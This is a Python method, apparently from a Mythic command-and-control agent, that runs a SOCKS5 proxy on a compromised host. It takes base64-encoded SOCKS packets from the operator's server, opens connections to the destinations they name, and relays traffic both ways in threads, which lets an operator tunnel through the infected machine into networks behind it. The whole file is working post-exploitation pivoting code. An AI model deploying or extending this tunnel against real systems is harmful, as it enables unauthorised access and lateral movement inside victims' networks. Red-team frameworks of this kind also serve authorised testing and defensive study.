    def socks(self, task_id, action, port):
        import socket, select, queue
        from threading import Thread, active_count, Lock
        from struct import pack, unpack
        import time
        import base64
        import threading
        
        # Enhanced configuration - more conservative improvements
        MAX_THREADS = 250  # Slightly increased
        BUFSIZE = 4096     # Doubled buffer size
        TIMEOUT_SOCKET = 8  # Slightly increased timeout
        OUTGOING_INTERFACE = ""

        # SOCKS5 protocol constants
        VER = b'\x05'
        M_NOAUTH = b'\x00'
        M_NOTAVAILABLE = b'\xff'
        CMD_CONNECT = b'\x01'
        ATYP_IPV4 = b'\x01'
        ATYP_DOMAINNAME = b'\x03'

        # Improved performance settings
        SOCKS_SLEEP_INTERVAL = 0.05  # Slightly faster than original
        QUEUE_TIMEOUT = 1

        # Simple statistics tracking
        if not hasattr(self, 'socks_stats'):
            self.socks_stats = {'connections': 0, 'bytes_sent': 0}
        stats_lock = Lock()

        def sendSocksPacket(server_id, data, exit_value):
            try:
                self.socks_out.put({ 
                    "server_id": server_id, 
                    "data": base64.b64encode(data).decode() if data else "", 
                    "exit": exit_value 
                })
            except Exception:
                pass
            
        def create_socket():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT_SOCKET)
                # Add socket optimizations
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except:
                    pass  # Ignore if not supported
                return sock
            except Exception as err:
                return "Failed to create socket: {}".format(str(err))

        def connect_to_dst(dst_addr, dst_port):
            sock = create_socket()
            if isinstance(sock, str):  # Error creating socket
                return 0
                
            if OUTGOING_INTERFACE:
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, 
                                  OUTGOING_INTERFACE.encode())
                except PermissionError:
                    return 0
            try:
                sock.connect((dst_addr, dst_port))
                with stats_lock:
                    self.socks_stats['connections'] += 1
                return sock
            except socket.error:
                try:
                    sock.close()
                except:
                    pass
                return 0

        def request_client(msg):
            try:
                message = base64.b64decode(msg["data"])
                s5_request = message[:BUFSIZE]
            except:
                return False
                
            if len(s5_request) < 4:
                return False
                
            if (s5_request[0:1] != VER or 
                s5_request[1:2] != CMD_CONNECT or 
                s5_request[2:3] != b'\x00'):
                return False
                
            try:
                if s5_request[3:4] == ATYP_IPV4:
                    if len(s5_request) < 10:
                        return False
                    dst_addr = socket.inet_ntoa(s5_request[4:8])
                    dst_port = unpack('>H', s5_request[8:10])[0]
                elif s5_request[3:4] == ATYP_DOMAINNAME:
                    if len(s5_request) < 5:
                        return False
                    sz_domain_name = s5_request[4]
                    if len(s5_request) < 5 + sz_domain_name + 2:
                        return False
                    dst_addr = s5_request[5:5 + sz_domain_name].decode('utf-8')
                    port_offset = 5 + sz_domain_name
                    dst_port = unpack('>H', s5_request[port_offset:port_offset + 2])[0]
                else:
                    return False
                return (dst_addr, dst_port)
            except:
                return False

        def create_connection(msg):
            dst = request_client(msg)
            rep = b'\x07'
            bnd = b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00'
            socket_dst = None
            
            if dst: 
                socket_dst = connect_to_dst(dst[0], dst[1])
                
            if not dst or socket_dst == 0: 
                rep = b'\x01'
            else:
                rep = b'\x00'
                try:
                    bnd = socket.inet_aton(socket_dst.getsockname()[0])
                    bnd += pack(">H", socket_dst.getsockname()[1])
                except:
                    bnd = b'\x00' * 6
                    
            reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
            try: 
                sendSocksPacket(msg["server_id"], reply, msg["exit"])                
            except: 
                if socket_dst and socket_dst != 0:
                    try:
                        socket_dst.close()
                    except:
                        pass
                return None
                
            if rep == b'\x00': 
                return socket_dst
            return None

        def get_running_socks_thread():
            return [t for t in threading.enumerate() 
                   if "socks:" in t.name and task_id not in t.name]

        def a2m(server_id, socket_dst):
            """Agent to Mythic with improved buffering"""
            try:
                while True:
                    if task_id not in [task["task_id"] for task in self.taskings]: 
                        return
                    elif [task for task in self.taskings 
                          if task["task_id"] == task_id][0]["stopped"]: 
                        return
                    if server_id not in self.socks_open.keys(): 
                        return
                        
                    try: 
                        reader, _, error = select.select([socket_dst], [], [socket_dst], 1)
                    except select.error:
                        return

                    if error:
                        sendSocksPacket(server_id, b"", True)
                        return

                    if reader:
                        try:
                            data = socket_dst.recv(BUFSIZE)
                            if not data:
                                sendSocksPacket(server_id, b"", True)
                                return
                            sendSocksPacket(server_id, data, False)
                            with stats_lock:
                                self.socks_stats['bytes_sent'] += len(data)
                        except socket.error:
                            return
                    
                    time.sleep(SOCKS_SLEEP_INTERVAL)
            except Exception:
                pass
            finally:
                try:
                    socket_dst.close()
                except:
                    pass

        def m2a(server_id, socket_dst):
            """Mythic to Agent with improved error handling"""
            try:
                while True:
                    if task_id not in [task["task_id"] for task in self.taskings]: 
                        return
                    elif [task for task in self.taskings 
                          if task["task_id"] == task_id][0]["stopped"]: 
                        return                
                    if server_id not in self.socks_open.keys():
                        return
                        
                    try:
                        if not self.socks_open[server_id].empty():
                            data = self.socks_open[server_id].get(timeout=QUEUE_TIMEOUT)
                            decoded_data = base64.b64decode(data)
                            socket_dst.send(decoded_data)
                            with stats_lock:
                                self.socks_stats['bytes_sent'] += len(decoded_data)
                    except queue.Empty:
                        pass
                    except Exception:
                        return
                    
                    time.sleep(SOCKS_SLEEP_INTERVAL)
            except Exception:
                pass
            finally:
                try:
                    socket_dst.close()
                except:
                    pass

        t_socks = get_running_socks_thread()

        if action == "start":
            if len(t_socks) > 0: 
                return "[!] SOCKS Proxy already running."
            
            self.sendTaskOutputUpdate(task_id, 
                "[*] Enhanced SOCKS5 Proxy started (Buffer: {}KB, Max threads: {}).\n".format(
                    BUFSIZE//1024, MAX_THREADS))
            
            while True:
                if [task for task in self.taskings 
                    if task["task_id"] == task_id][0]["stopped"]:
                    with stats_lock:
                        stats_msg = "[*] Final stats - Connections: {}, Bytes: {}KB\n".format(
                            self.socks_stats['connections'], 
                            self.socks_stats['bytes_sent']//1024)
                    self.sendTaskOutputUpdate(task_id, stats_msg)
                    return "[*] Enhanced SOCKS Proxy stopped."
                    
                if not self.socks_in.empty():
                    try:
                        packet_json = self.socks_in.get(timeout=QUEUE_TIMEOUT)
                        if packet_json:
                            server_id = packet_json["server_id"]
                            if server_id in self.socks_open.keys():
                                if packet_json["data"]: 
                                    self.socks_open[server_id].put(packet_json["data"])
                                elif packet_json["exit"]:
                                    self.socks_open.pop(server_id)
                            else:
                                if not packet_json["exit"]:    
                                    if active_count() > MAX_THREADS:
                                        time.sleep(0.1)  # Shorter sleep when busy
                                        continue
                                    self.socks_open[server_id] = queue.Queue()
                                    sock = create_connection(packet_json)
                                    if sock:
                                        send_thread = Thread(
                                            target=a2m, 
                                            args=(server_id, sock), 
                                            name="a2m:{}".format(server_id),
                                            daemon=True)
                                        recv_thread = Thread(
                                            target=m2a, 
                                            args=(server_id, sock), 
                                            name="m2a:{}".format(server_id),
                                            daemon=True)
                                        send_thread.start()
                                        recv_thread.start()
                    except queue.Empty:
                        pass
                    except Exception as e:
                        # Log error but continue
                        pass
                        
                time.sleep(SOCKS_SLEEP_INTERVAL)
        else:
            if len(t_socks) > 0:
                for t_sock in t_socks:
                    try:
                        task_name_parts = t_sock.name.split(":")
                        if len(task_name_parts) > 1:
                            task_id_from_name = task_name_parts[1]
                            task = [task for task in self.taskings 
                                   if task["task_id"] == task_id_from_name]
                            if task:
                                task[0]["stopped"] = task[0]["completed"] = True
                    except:
                        pass
                self.socks_open = {}
                return "[*] Enhanced SOCKS Proxy stopped."
            else:
                return "[!] No SOCKS Proxy running to stop."